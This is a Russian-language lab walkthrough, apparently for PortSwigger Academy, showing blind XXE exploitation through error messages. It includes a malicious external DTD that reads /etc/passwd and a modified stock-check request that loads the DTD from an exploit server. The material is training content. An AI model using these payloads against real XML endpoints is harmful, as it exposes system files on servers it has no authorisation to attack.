Перейдем на `Go exploit server`
и заполним поля следующим образом
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

* Определяет объект параметра XML с именем `file`, содержащий содержимое файла `/etc/passwd`.
* Определяет объект параметра XML с именем `eval`, содержащий динамическое объявление другого объекта параметра XML с именем `error`. Сущность ошибки будет оценена путем загрузки несуществующего файла, имя которого содержит значение сущности файла.
* Использует объект `eval`, который вызывает динамическое объявление объекта ошибки.
* Использует объект ошибки, так что его значение оценивается при попытке загрузить несуществующий файл, что приводит к сообщению об ошибке, содержащему имя несуществующего файла, который является содержимым файла `/etc/passwd`.

и получим урлу
```
https://exploit-0a6b0023044c44118037b666012b00e7.exploit-server.net/exploit.dtd
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/6.%20Exploiting%20blind%20XXE%20to%20retrieve%20data%20via%20error%20messages/pics%20for%20walktrough/1.png)

перейдем на случайный товар, смотрим его наличие и ищем в хттп прокси хистори данный запрос
```
POST /product/stock HTTP/2
?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
и отправим его в `Repeater`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/6.%20Exploiting%20blind%20XXE%20to%20retrieve%20data%20via%20error%20messages/pics%20for%20walktrough/2.png)
модифицируем запрос 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a6b0023044c44118037b666012b00e7.exploit-server.net/exploit.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
и получим 400 статус респонс код, но получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/6.%20Exploiting%20blind%20XXE%20to%20retrieve%20data%20via%20error%20messages/pics%20for%20walktrough/3.png)
